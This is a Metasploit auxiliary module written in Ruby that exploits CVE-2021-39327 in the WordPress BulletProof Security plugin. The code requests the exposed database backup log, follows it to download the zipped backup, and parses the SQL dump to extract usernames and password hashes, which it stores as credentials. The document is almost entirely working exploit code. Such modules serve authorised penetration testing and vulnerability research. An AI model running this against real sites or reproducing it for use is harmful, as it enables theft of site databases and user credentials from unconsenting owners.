##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'rex/zip'

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HTTP::Wordpress
  include Msf::Auxiliary::Scanner

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Wordpress BulletProof Security Backup Disclosure',
        'Description' => %q{
          The Wordpress plugin BulletProof Security, versions <= 5.1, suffers from an information disclosure
          vulnerability, in that the db_backup_log.txt is publicly accessible.  If the backup functionality
          is being utilized, this file will disclose where the backup files can be downloaded.
          After downloading the backup file, it will be parsed to grab all user credentials.
        },
        'Author' => [
          'Ron Jost (Hacker5preme)', # EDB module/discovery
          'h00die' # Metasploit module
        ],
        'License' => MSF_LICENSE,
        'References' => [
          ['EDB', '50382'],
          ['CVE', '2021-39327'],
          ['PACKETSTORM', '164420'],
          ['URL', 'https://github.com/Hacker5preme/Exploits/blob/main/Wordpress/CVE-2021-39327/README.md']
        ],
        'Privileged' => false,
        'Platform' => 'php',
        'Arch' => ARCH_PHP,
        'DisclosureDate' => '2021-09-17',
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [],
          'SideEffects' => [IOC_IN_LOGS]
        }
      )
    )
  end

  def parse_sqldump_fields(line)
    # pull all fields
    line =~ /\((.+)\)/
    return nil if Regexp.last_match(1).nil?

    fields = line.split(',')
    # strip each field
    fields.collect { |e| e ? e.strip : e }
  end

  def parse_sqldump(content, ip)
    read_next_line = false
    login = nil
    hash = nil
    content.each_line do |line|
      if read_next_line
        print_status("Found user line: #{line.strip}")
        fields = parse_sqldump_fields(line)
        username = fields[login].strip[1...-1] # remove quotes
        password = fields[hash].strip[1...-1] # remove quotes
        print_good("  Extracted user content: #{username} -> #{password}")
        read_next_line = false
        create_credential({
          workspace_id: myworkspace_id,
          origin_type: :service,
          module_fullname: fullname,
          username: username,
          private_type: :nonreplayable_hash,
          jtr_format: Metasploit::Framework::Hashes.identify_hash(password),
          private_data: password,
          service_name: 'Wordpress',
          address: ip,
          port: datastore['RPORT'],
          protocol: 'tcp',
          status: Metasploit::Model::Login::Status::UNTRIED
        })
      end
      # INSERT INTO `wp_users` ( ID, user_login, user_pass, user_nicename, user_email, user_url, user_registered, user_activation_key, user_status, display_name )
      next unless line.start_with?('INSERT INTO `wp_users`')

      read_next_line = true
      # process insert statement to find the fields we want
      next unless hash.nil?

      fields = parse_sqldump_fields(line)
      login = fields.index('user_login')
      hash = fields.index('user_pass')
    end
  end

  def parse_log(content, ip)
    base = nil
    file = nil
    content.each_line do |line|
      if line.include? 'DB Backup File Download Link|URL: '
        base = line.split(': ').last
        base = base.split('/')
        base = base[3, base.length] # strip off anything before the URI
        base = "/#{base.join('/')}".strip
      end
      if line.include? 'Zip Backup File Name: '
        file = line.split(': ').last
        file = file.split('/').last.strip
      end

      next if base.nil? || file.nil?

      vprint_status("Pulling: #{base}#{file}")
      res = send_request_cgi({
        'uri' => normalize_uri("#{base}#{file}")
      })
      base = nil
      next unless res && res.code == 200

      p = store_loot(file, 'application/zip', rhost, res.body, file)
      print_good("Stored DB Backup #{file} to #{p}, size: #{res.body.length}")
      Zip::File.open(p) do |zip_file|
        zip_file.each do |inner_file|
          is = inner_file.get_input_stream
          sqldump = is.read
          is.close
          parse_sqldump(sqldump, ip)
        end
      end
    end
  end

  def run_host(ip)
    vprint_status('Checking if target is online and running Wordpress...')
    fail_with(Failure::BadConfig, 'The target is not online and running Wordpress') unless wordpress_and_online?
    vprint_status('Checking plugin installed and vulnerable')
    checkcode = check_plugin_version_from_readme('bulletproof-security', '5.2')
    fail_with(Failure::BadConfig, 'The target is not running a vulnerable bulletproof-security version') if checkcode == Exploit::CheckCode::Safe
    print_status('Requesting Backup files')
    ['/wp-content/bps-backup/logs/db_backup_log.txt', '/wp-content/plugins/bulletproof-security/admin/htaccess/db_backup_log.txt'].each do |url|
      res = send_request_cgi({
        'uri' => normalize_uri(target_uri.path, url)
      })

      # <65 in length will be just the banner, like:
      # BPS DB BACKUP LOG
      # ==================
      # ==================
      unless res && res.code == 200 && res.body.length > 65
        print_error("#{url} not found on server or no data")
        next
      end
      filename = url.split('/').last
      p = store_loot(filename, 'text/plain', rhost, res.body, filename)
      print_good("Stored #{filename} to #{p}, size: #{res.body.length}")
      parse_log(res.body, ip)
    end
  end
end
